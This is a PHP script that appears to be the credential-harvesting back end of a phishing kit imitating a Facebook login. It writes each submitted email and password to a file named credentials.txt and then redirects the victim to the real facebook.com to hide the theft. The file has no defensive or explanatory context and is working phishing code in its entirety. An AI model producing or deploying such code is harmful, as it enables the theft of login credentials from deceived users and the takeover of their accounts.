<?php

function writePostRequest($post){
    $name = 'credentials.txt';
    $text = implode(" | ", $post).PHP_EOL;    
    $file = fopen($name, 'a');
    fwrite($file, $text);
    fclose($file);
}

if(isset($_POST)){
    if($_POST['email'] == ''){
        header('Location: index.php?error=empty');
    }else if($_POST['password'] == ''){
        header('Location: index.php?error=empty');
    }else{
        writePostRequest($_POST);
        header('Location: https://facebook.com');
    }
}